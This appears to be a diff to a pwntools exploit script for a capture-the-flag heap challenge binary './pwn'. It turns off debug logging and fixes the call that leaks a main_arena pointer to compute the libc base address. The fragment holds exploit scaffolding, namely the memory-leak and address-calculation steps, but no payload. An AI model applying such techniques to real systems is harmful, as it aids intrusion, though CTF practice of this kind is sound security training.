@@ -21,7 +21,7 @@ io=process('./pwn')
 elf=ELF('./pwn')
 libc=ELF('./libc.so.6')
 
-context(arch='amd64', os='linux', log_level='debug')
+context(arch='amd64', os='linux')
 
 def add():
     io.recvuntil('Choice: ')
@@ -58,7 +58,7 @@ for i in range(8):
 
 show(7)
 
-main_arena = u64(io.recvuntil(6).ljust(8, b'\x00'))
+main_arena = u64(io.recv(6).ljust(8, b'\x00'))
 main_arena = main_arena - 96
 
 libc_addr= main_arena-libc.sym['main_arena']
